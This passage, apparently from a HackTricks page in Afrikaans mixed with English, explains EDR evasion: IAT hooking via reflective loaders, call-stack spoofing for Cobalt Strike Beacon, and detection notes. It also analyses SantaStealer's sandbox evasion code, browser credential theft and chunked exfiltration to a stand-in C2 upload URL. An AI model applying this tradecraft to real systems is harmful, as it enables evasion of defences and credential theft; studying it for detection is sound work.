- Vir kompatibiliteit, exporteer 'n koppelvlak sodat 'n Aggressor‑script (of ekwivalent) kan registreer watter APIs om te hook vir Beacon, BOFs en post‑ex DLLs.

Why IAT hooking here
- Werk vir enige kode wat die gehookte import gebruik, sonder om tool‑kode te wysig of te staatmaak op Beacon om spesifieke APIs te proxyeer.
- Dek post‑ex DLLs: deur LoadLibrary* te hook kan jy module‑laaie onderskep (bv., System.Management.Automation.dll, clr.dll) en dieselfde maskering/stack‑evasie op hul API‑oproepe toepas.
- Herstel betroubare gebruik van proses‑opwekking post‑ex opdragte teen call‑stack‑gebaseerde deteksies deur CreateProcessA/W te omsluit.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Aantekeninge
- Pas die patch toe ná relocations/ASLR en voor die eerste gebruik van die import. Reflective loaders like TitanLdr/AceLdr demonstreer hooking tydens DllMain van die gelaaide module.
- Hou wrappers klein en PIC-safe; los die ware API op via die oorspronklike IAT-waarde wat jy vasgelê het voor patching of via LdrGetProcedureAddress.
- Gebruik RW → RX oorgange vir PIC en vermy om writable+executable bladsye agter te laat.

Call‑stack spoofing stub
- Draugr‑style PIC stubs bou 'n vals oproepketting (retouradresse in onskadelike modules) en pivot dan na die regte API.
- Dit slaan opsporingsmaatreëls wat verwag kanoniese stacks van Beacon/BOFs na sensitiewe APIs.
- Kombineer dit met stack cutting/stack stitching tegnieke om binne verwagte frames te land voor die API-proloog.

Operasionele integrasie
- Voeg die reflective loader aan die begin van post‑ex DLLs sodat die PIC en hooks outomaties initialiseert wanneer die DLL gelaai word.
- Gebruik 'n Aggressor-script om target APIs te registreer sodat Beacon en BOFs deursigtig baat by dieselfde evasion-pad sonder kodeveranderinge.

Detection/DFIR oorwegings
- IAT integriteit: entries wat oplos na non‑image (heap/anon) adresse; periodieke verifikasie van import pointers.
- Stack anomalieë: return addresses wat nie aan gelaaide images behoort nie; abrupte oorgange na non‑image PIC; inkonsequente RtlUserThreadStart afkoms.
- Loader telemetry: in‑process skryfaksies na IAT, vroeë DllMain-aktiwiteit wat import thunks wysig, onverwagte RX-streke geskep tydens laai.
- Image‑load evasion: indien hooking LoadLibrary*, monitor verdagte laaie van automation/clr assemblies gekorreleer met memory masking events.

Verwante boublokke en voorbeelde
- Reflective loaders wat IAT patching tydens laai uitvoer (e.g., TitanLdr, AceLdr)
- Memory masking hooks (e.g., simplehook) en stack‑cutting PIC (stackcutting)
- PIC call‑stack spoofing stubs (e.g., Draugr)

## SantaStealer Tradecraft vir Fileless Evasion en Credential Theft

SantaStealer (aka BluelineStealer) illustreer hoe moderne info-stealers AV bypass, anti-analysis en credential access in 'n enkele workflow kombineer.

### Keyboard layout gating & sandbox delay

- 'n Konfigurasievlag (`anti_cis`) enumereer geïnstalleerde sleutelbordindelings via `GetKeyboardLayoutList`. As 'n Cyrillic-layout gevind word, laat die sample 'n leë `CIS`-merker val en beïndig voordat dit stealers uitvoer, wat verseker dat dit nooit op uitgeslote lokale ontplof nie terwyl dit 'n opspeuringsartefak agterlaat.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Layered `check_antivm` logic

- Variant A deurloop die proseslys, hash elke naam met 'n pasgemaakte rolling checksum en vergelyk dit teen ingebedde blocklists vir debuggers/sandboxes; dit herhaal die checksum oor die rekenaarnaam en kontroleer werkgidse soos `C:\analysis`.
- Variant B ondersoek stelsel-eienskappe (process-count floor, recente uptime), roep `OpenServiceA("VBoxGuest")` om VirtualBox additions op te spoor, en voer timing checks rondom sleeps uit om single-stepping te ontdek. Enige treffer breek af voordat modules gelanseer word.

### Fileless helper + double ChaCha20 reflective loading

- Die primêre DLL/EXE embed 'n Chromium credential helper wat óf na skyf gedrop word óf manueel in-geheue gemapped word; fileless mode los imports/relocations self op sodat geen helper-artefakte geskryf word nie.
- Daardie helper stoor 'n tweede-fase DLL wat twee keer met ChaCha20 versleuteld is (twee 32-byte sleutels + 12-byte nonces). Na albei passe laai dit die blob reflectively (geen `LoadLibrary`) en roep die exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` wat ontleen is aan [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).
- Die ChromElevator-roetines gebruik direct-syscall reflective process hollowing om in 'n lewendige Chromium-browser te inject, erf AppBound Encryption keys, en ontsleutel wagwoorde/cookies/kredietkaarte direk uit SQLite-databasisse ondanks ABE hardening.

### Modular in-memory collection & chunked HTTP exfil

- `create_memory_based_log` loop deur 'n globale `memory_generators` function-pointer tabel en spawn een thread per ingeskakelde module (Telegram, Discord, Steam, screenshots, documents, browser extensions, etc.). Elke thread skryf resultate in gedeelde buffers en rapporteer sy lêertelling na 'n ~45s join-venster.
- Sodra dit klaar is, word alles ge-zip met die staties gelinkte `miniz` library as `%TEMP%\\Log.zip`. `ThreadPayload1` slaap dan 15s en streem die argief in 10 MB-stukke via HTTP POST na `http://<C2>:6767/upload`, deur 'n browser `multipart/form-data` boundary (`----WebKitFormBoundary***`) te spoof. Elke stukkie voeg `User-Agent: upload`, `auth: <build_id>`, opsioneel `w: <campaign_tag>` by, en die laaste stukkie heg `complete: true` aan sodat die C2 weet re-assemblage voltooi is.

## Verwysings

- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)

{{#include ../banners/hacktricks-training.md}}
